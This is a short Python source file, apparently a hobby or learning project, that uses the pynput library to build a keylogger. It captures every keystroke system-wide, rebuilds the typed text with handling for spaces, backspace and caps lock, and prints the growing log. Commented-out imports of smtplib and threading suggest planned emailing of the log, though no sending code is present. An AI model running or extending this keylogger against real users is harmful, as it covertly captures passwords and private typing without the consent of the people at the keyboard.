import pynput.keyboard as keyboard
# import threading

# import smtplib

log =""
caps = False
count = 0
def get_keys(key):
    global log,caps,count
    # case = False
    try:

        if caps: 
            log=log+str(key.char).swapcase()
        else:
            log=log+str(key.char)
        # log+log+str(key.char).swapcase()
    
    except Exception:
        if str(key) == 'Key.space':
            log +=" "

        elif str(key) == 'Key.shift':
            pass

        elif str(key)=='Key.backspace':
            log=log[:-1]

        elif str(key)=='Key.caps_lock':
            caps = True
            count+=1
            if count > 1:
                count= 0
                caps=False
    print(log)

listener=keyboard.Listener(on_press=get_keys)

with listener:
    listener.join()
